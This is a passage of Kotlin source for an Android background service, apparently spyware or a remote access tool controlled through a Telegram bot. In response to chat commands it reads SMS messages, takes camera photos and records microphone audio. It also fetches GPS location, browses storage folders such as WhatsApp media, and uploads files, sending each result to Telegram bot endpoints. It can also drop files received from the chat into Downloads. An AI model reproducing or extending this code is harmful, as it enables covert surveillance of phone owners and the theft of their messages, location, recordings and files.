            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            selection,
            selArgs,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return results

        cursor.use { c ->
            val addrCol = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = c.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
            val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)

            while (c.moveToNext() && results.size < limit) {
                val address = c.getString(addrCol) ?: "Unknown"
                val rawBody = c.getString(bodyCol) ?: ""
                val dateMs = c.getLong(dateCol)
                val smsType = c.getInt(typeCol)

                val body = if (rawBody.length > 120)
                    rawBody.take(120) + "…"
                else
                    rawBody

                val safeBody = body
                    .replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("`", "\\`")
                    .replace("[", "\\[")

                val dirEmoji = if (smsType == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"

                results.add(
                    SmsEntry(
                        dirEmoji = dirEmoji,
                        address = address,
                        dateStr = dateFmt.format(Date(dateMs)),
                        body = safeBody
                    )
                )
            }
        }

        return results
    }

    private fun handleCamera(chatId: String, cameraSelector: CameraSelector) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ CAMERA permission not granted.")
            return
        }

        val label = if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        sendMessage(chatId, "📷 Taking photo ($label camera)…")

        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                var cameraProvider: ProcessCameraProvider? = null
                try {
                    cameraProvider = providerFuture.get()

                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(
                        this,
                        cameraSelector,
                        capture
                    )

                    val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    capture.takePicture(
                        outputOptions,
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {

                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.i(TAG, "Photo saved, camera released")
                                sendPhoto(chatId, photoFile)
                                photoFile.delete()
                            }

                            override fun onError(exc: ImageCaptureException) {
                                mainHandler.post {
                                    try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                                }
                                Log.e(TAG, "Photo capture failed: ${exc.message}")
                                sendMessage(chatId, "❌ Failed to take photo: ${exc.message}")
                            }
                        }
                    )

                } catch (e: Exception) {
                    mainHandler.post {
                        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
                    }
                    Log.e(TAG, "Camera error: ${e.message}")
                    sendMessage(chatId, "❌ Camera error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun handleLocation(chatId: String) {
        val hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            sendMessage(chatId, "⚠️ Location permission not granted.")
            return
        }

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager

        val lastKnown: Location? = try {
            val gps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when {
                gps != null && network != null ->
                    if (gps.time >= network.time) gps else network
                gps != null -> gps
                else -> network
            }
        } catch (e: SecurityException) {
            null
        }

        val maxAgeMs = 3 * 60 * 1000L
        val now = System.currentTimeMillis()

        if (lastKnown != null && (now - lastKnown.time) <= maxAgeMs) {
            sendLocationReply(chatId, lastKnown, fresh = false)
            return
        }

        sendMessage(chatId, "📡 Acquiring GPS fix…")

        val timeoutMs = 20_000L
        val provider = when {
            hasFine -> LocationManager.GPS_PROVIDER
            else -> LocationManager.NETWORK_PROVIDER
        }

        var responded = false

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendLocationReply(chatId, location, fresh = true)
                }
            }

            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

            override fun onProviderEnabled(provider: String) {}

            override fun onProviderDisabled(provider: String) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendMessage(chatId, "❌ Location provider disabled.")
                }
            }
        }

        try {
            locationManager.requestLocationUpdates(
                provider,
                0L,
                0f,
                listener,
                mainHandler.looper
            )
        } catch (e: SecurityException) {
            sendMessage(chatId, "❌ Location permission revoked: ${e.message}")
            return
        }

        mainHandler.postDelayed({
            if (!responded) {
                responded = true
                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                if (lastKnown != null) {
                    sendLocationReply(chatId, lastKnown, fresh = false, staleWarning = true)
                } else {
                    sendMessage(chatId, "❌ Could not obtain a location fix. Make sure GPS is enabled.")
                }
            }
        }, timeoutMs)
    }

    private fun sendLocationReply(
        chatId: String,
        location: Location,
        fresh: Boolean,
        staleWarning: Boolean = false
    ) {
        val lat = location.latitude
        val lon = location.longitude
        val acc = if (location.hasAccuracy()) "±${location.accuracy.toInt()} m" else "unknown"
        val alt = if (location.hasAltitude()) "${location.altitude.toInt()} m" else "N/A"
        val mapsUrl = "https://maps.google.com/?q=$lat,$lon"

        val ageSeconds = (System.currentTimeMillis() - location.time) / 1000
        val ageLabel = when {
            ageSeconds < 60 -> "${ageSeconds}s ago"
            ageSeconds < 3600 -> "${ageSeconds / 60}m ago"
            else -> "${ageSeconds / 3600}h ago"
        }

        val header = when {
            staleWarning -> "⚠️ *Stale location* (GPS timed out, sending last known fix):"
            fresh -> "📍 *Current Location*:"
            else -> "📍 *Last Known Location* ($ageLabel):"
        }

        val msg = """
            $header
            
            🌐 Lat: `$lat`
            🌐 Lon: `$lon`
            🎯 Accuracy: $acc
            ⛰ Altitude: $alt
            🗺 [Open in Google Maps]($mapsUrl)
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")

        // Also send location as a Telegram location message
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("latitude", lat)
                put("longitude", lon)
                put("horizontal_accuracy", location.accuracy.toInt())
            }

            val body = json.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(URL_SEND_LOCATION_CMD)
                .post(body)
                .build()

            httpClientCmd.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendLocation failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendLocation error: ${e.message}")
        }
    }

    private fun handleFiles(chatId: String, args: String) {
        val trimmed = args.trim()
        if (trimmed.isEmpty()) {
            listFiles(chatId)
        } else {
            val num = trimmed.toIntOrNull()
            if (num != null) {
                sendFileByNumber(chatId, num)
            } else {
                sendMessage(chatId,
                    "Usage:\n" +
                            "• /files — list files\n" +
                            "• /files <number> — send that file to this chat\n" +
                            "• Send any file/photo to this chat → saves it to Downloads"
                )
            }
        }
    }

    private fun listFiles(chatId: String) {
        val entries = mutableListOf<FileEntry>()

        fun queryCollection(
            collectionUri: Uri,
            mimeDefault: String,
            slotLimit: Int = MAX_FILES
        ) {
            if (entries.size >= MAX_FILES) return
            val canTake = minOf(slotLimit, MAX_FILES - entries.size)
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE
            )
            contentResolver.query(
                collectionUri,
                projection,
                "${MediaStore.MediaColumns.SIZE} > 0",
                null,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                var taken = 0
                while (cursor.moveToNext() && taken < canTake) {
                    val id = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "unknown"
                    val size = cursor.getLong(sizeCol)
                    val mime = cursor.getString(mimeCol) ?: mimeDefault
                    val uri = Uri.withAppendedPath(collectionUri, id.toString())
                    entries.add(FileEntry(name, uri, size, mime))
                    taken++
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            queryCollection(MediaStore.Downloads.EXTERNAL_CONTENT_URI, "application/octet-stream")
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && entries.size < MAX_FILES) {
            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            dir.listFiles()
                ?.sortedByDescending { it.lastModified() }
                ?.forEach { file ->
                    if (entries.size >= MAX_FILES) return@forEach
                    if (!file.isDirectory && file.length() > 0) {
                        val mime = MimeTypeMap.getSingleton()
                            .getMimeTypeFromExtension(file.extension.lowercase())
                            ?: "application/octet-stream"
                        entries.add(FileEntry(file.name, Uri.fromFile(file), file.length(), mime))
                    }
                }
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/jpeg", slotLimit = 5)
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/mp4", slotLimit = 5)
        }

        if (entries.size < MAX_FILES) {
            queryCollection(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/mpeg", slotLimit = 5)
        }

        if (entries.isEmpty()) {
            sendMessage(chatId, "📂 No files found in storage.")
            return
        }

        fileCache[chatId] = entries

        val sb = StringBuilder("📂 *Files on device* (${entries.size}):\n\n")
        entries.forEachIndexed { i, f ->
            val sizeLabel = when {
                f.sizeBytes >= 1_048_576 -> "${String.format("%.1f", f.sizeBytes / 1_048_576.0)} MB"
                f.sizeBytes >= 1_024 -> "${String.format("%.1f", f.sizeBytes / 1_024.0)} KB"
                else -> "${f.sizeBytes} B"
            }
            sb.append("${i + 1}. `${f.displayName}` — $sizeLabel\n")
        }
        sb.append("\nReply with `/files <number>` to receive a file.")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFileByNumber(chatId: String, number: Int) {
        val list = fileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No file list for this chat. Send /files first.")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val entry = list[idx]
        sendMessage(chatId, "📤 Sending *${entry.displayName}*…", parseMode = "Markdown")

        try {
            val stream = contentResolver.openInputStream(entry.uri)
                ?: run { sendMessage(chatId, "❌ Cannot read file."); return }

            val bytes = stream.use { it.readBytes() }
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    "document",
                    entry.displayName,
                    bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull())
                )
                .addFormDataPart("caption", "📎 ${entry.displayName}")
                .build()

            val request = Request.Builder().url(URL_SEND_DOCUMENT_CMD).post(body).build()
            httpClientCmd.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendDocument failed: ${response.code}")
                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFileByNumber exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private fun handleAudio(chatId: String, seconds: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ RECORD_AUDIO permission not granted.")
            return
        }

        val duration = seconds.coerceIn(1, 120)
        sendMessage(chatId, "🎙️ Recording audio for $duration seconds…")

        serviceScope.launch {
            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val recorder: android.media.MediaRecorder =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    android.media.MediaRecorder(this@MonitorService)
                else
                    android.media.MediaRecorder()

            try {
                recorder.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128_000)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }

                delay(duration * 1_000L)

                recorder.stop()
                recorder.release()

                if (!outFile.exists() || outFile.length() == 0L) {
                    sendMessage(chatId, "❌ Recording produced an empty file.")
                    return@launch
                }

                val bytes = outFile.readBytes()
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(
                        "audio",
                        outFile.name,
                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
                    )
                    .addFormDataPart("title", "Recording (${duration}s)")
                    .addFormDataPart("duration", duration.toString())
                    .build()

                val request = Request.Builder().url(URL_SEND_AUDIO_CMD).post(body).build()
                httpClientCmd.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.w(TAG, "sendAudio failed: ${response.code}")
                        sendMessage(chatId, "❌ Upload failed: ${response.code}")
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Audio recording error: ${e.message}")
                sendMessage(chatId, "❌ Recording error: ${e.message}")
                try { recorder.release() } catch (_: Exception) {}
            } finally {
                try { outFile.delete() } catch (_: Exception) {}
            }
        }
    }

    private fun handleFileMn(chatId: String, arg: String) {
        if (arg.isEmpty()) {
            showTopFolders(chatId)
            return
        }

        val parts = arg.split(" ")
        val lastNum = parts.last().toIntOrNull()
        if (lastNum != null && parts.size >= 2) {
            sendFolderFile(chatId, lastNum)
            return
        }

        listFolderContents(chatId, arg)
    }

    private fun showTopFolders(chatId: String) {
        val root = Environment.getExternalStorageDirectory()
        val dirs = root.listFiles()
            ?.filter { it.isDirectory }
            ?.sortedBy { it.name.lowercase() }
            ?: emptyList()

        if (dirs.isEmpty()) {
            sendMessage(chatId, "📁 No folders found on storage.")
            return
        }

        val sb = StringBuilder("📁 *Folders on device:*\n\n")
        dirs.forEach { dir ->
            val count = dir.listFiles()?.size ?: 0
            sb.append("• `${dir.name}` — $count items\n")
        }
        sb.append("\n📂 Type `/filemn <folder>` to browse files inside it.")
        sb.append("\n📂 Sub-folders: `/filemn WhatsApp/Media`")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun listFolderContents(chatId: String, folderPath: String) {
        val root = Environment.getExternalStorageDirectory()

        val target: File? = run {
            val direct = File(root, folderPath)
            if (direct.exists() && direct.isDirectory) return@run direct

            var current = root
            for (segment in folderPath.split("/")) {
                current = current.listFiles()
                    ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
                    ?: return@run null
            }
            current
        }

        if (target == null) {
            sendMessage(chatId, "❌ Folder `$folderPath` not found.\n\nUse /filemn to see all folders.", parseMode = "Markdown")
            return
        }

        val all = target.listFiles() ?: emptyArray()
        val files = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }.take(30)
        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name }

        if (files.isEmpty() && subDirs.isEmpty()) {
            sendMessage(chatId, "📂 Folder `${target.name}` is empty.", parseMode = "Markdown")
            return
        }

        folderFileCache[chatId] = files

        val sb = StringBuilder("📂 *${folderPath}/* \n\n")

        if (subDirs.isNotEmpty()) {
            sb.append("🗂 *Sub-folders:*\n")
            subDirs.forEach { d ->
                val c = d.listFiles()?.size ?: 0
                sb.append("  • `${d.name}` ($c items)  → `/filemn $folderPath/${d.name}`\n")
            }
            sb.append("\n")
        }

        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f ->
                val size = when {
                    f.length() >= 1_048_576 -> "${String.format("%.1f", f.length() / 1_048_576.0)} MB"
                    f.length() >= 1_024 -> "${String.format("%.1f", f.length() / 1_024.0)} KB"
                    else -> "${f.length()} B"
                }
                sb.append("${i + 1}. `${f.name}` — $size\n")
            }
            sb.append("\nType `/filemn $folderPath <number>` to download a file.")
        } else {
            sb.append("_(no files here — browse a sub-folder above)_")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFolderFile(chatId: String, number: Int) {
        val list = folderFileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No folder listed yet. Use `/filemn <folder>` first.", parseMode = "Markdown")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val file = list[idx]
        sendMessage(chatId, "📤 Sending *${file.name}*…", parseMode = "Markdown")
        try {
            val bytes = file.readBytes()
            val mime = MimeTypeMap.getSingleton()
                .getMimeTypeFromExtension(file.extension.lowercase())
                ?: "application/octet-stream"
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.name, bytes.toRequestBody(mime.toMediaTypeOrNull()))
                .addFormDataPart("caption", "📎 ${file.name}")
                .build()
            val req = Request.Builder().url(URL_SEND_DOCUMENT_CMD).post(body).build()
            httpClientCmd.newCall(req).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendFolderFile failed: ${response.code}")
                    sendMessage(chatId, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFolderFile exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private fun handleIncomingDocument(
        chatId: String,
        fileObj: JSONObject,
        fallbackName: String = "received_${System.currentTimeMillis()}"
    ) {
        val fileId = fileObj.optString("file_id").ifEmpty {
            sendMessage(chatId, "⚠️ Could not read file_id.")
            return
        }
        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }

        sendMessage(chatId, "💾 Saving *$fileName* to Downloads…", parseMode = "Markdown")

        serviceScope.launch {
            try {
                val filePath = getTelegramFilePath(fileId)
                if (filePath == null) {
                    sendMessage(chatId, "❌ Could not resolve file path from Telegram.")
                    return@launch
                }

                val downloadUrl = "$BASE_URL_CMD/file/bot$BOT_TOKEN_CMD/$filePath"
                val request = Request.Builder().url(downloadUrl).get().build()
                val bytes = httpClientCmd.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        sendMessage(chatId, "❌ Download failed: ${response.code}")
                        return@launch
                    }
                    response.body?.bytes() ?: run {
                        sendMessage(chatId, "❌ Empty response from Telegram.")
                        return@launch
                    }
                }

                val mime = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(fileName.substringAfterLast('.', ""))
                    ?: "application/octet-stream"

                val saved = saveToDownloads(fileName, mime, bytes)
                if (saved) {
                    sendMessage(chatId, "✅ *$fileName* saved to Downloads folder.", parseMode = "Markdown")
                } else {
                    sendMessage(chatId, "❌ Failed to write file to storage.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleIncomingDocument exception: ${e.message}")
                sendMessage(chatId, "❌ Error saving file: ${e.message}")
            }
        }
    }

    private fun getTelegramFilePath(fileId: String): String? {
        return try {
            val request = Request.Builder().url("$URL_GET_FILE_CMD?file_id=$fileId").get().build()
            val body = httpClientCmd.newCall(request).execute().use { it.body?.string() } ?: return null
            val json = JSONObject(body)
            if (!json.optBoolean("ok", false)) return null
            json.optJSONObject("result")?.optString("file_path")
        } catch (e: Exception) {
            Log.e(TAG, "getTelegramFilePath failed: ${e.message}")
            null
        }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val collection = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
                val uri = contentResolver.insert(collection, values) ?: return false

                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }

                values.clear()
                values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs()
                val file = File(dir, fileName)
                file.writeBytes(bytes)
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "saveToDownloads failed: ${e.message}")
            false
        }
    }

    // ================================================================
    //  MESSAGE SEND HELPERS
    // ================================================================

    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                if (parseMode != null) put("parse_mode", parseMode)
            }

            val body = json.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(URL_SEND_MSG_CMD)
                .post(body)
                .build()

            httpClientCmd.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendMessage failed: ${response.code} ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendMessage exception: ${e.message}")
        }
    }

    private fun sendPhoto(chatId: String, photoFile: File) {
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", "📸 Camera snapshot – ${
                    SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                }")
                .addFormDataPart(
                    "photo",
                    photoFile.name,
                    photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url(URL_SEND_PHOTO_CMD)
                .post(requestBody)
                .build()

            httpClientCmd.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.i(TAG, "Photo sent successfully")
                } else {
                    val err = response.body?.string()
                    Log.w(TAG, "sendPhoto failed: ${response.code} $err")
                    sendMessage(chatId, "❌ Photo upload failed: $err")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendPhoto exception: ${e.message}")
            sendMessage(chatId, "❌ Photo upload exception: ${e.message}")
        }
    }
}